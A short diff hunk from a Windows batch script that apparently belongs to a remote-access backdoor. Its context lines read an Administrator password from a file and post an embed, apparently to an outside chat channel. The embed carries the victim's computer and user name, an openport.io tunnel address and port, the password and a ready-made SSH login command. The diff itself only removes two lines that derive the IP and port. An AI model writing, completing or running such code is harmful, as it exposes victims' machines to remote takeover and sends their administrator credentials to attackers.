@@ -44,8 +44,6 @@ call source.bat +silent --file "!StatusFile!"
 
         FOR /F "delims=" %%F IN (!TFolder!\pass.txt) DO SET Pass=%%F
         set "Change=Changed"
-        set Port=%RemoteURL:~-5%
-        set IP=%RemoteURL:~0,14%
 
         call Source.bat +silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||openport.io:!Port!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)\\n\\n:arrow_right: **CMD command:** ||ssh Administrator@!IP! -p !Port!||" "FFFDBC" "https://i.imgur.com/b2Terft.png"
         :Loop
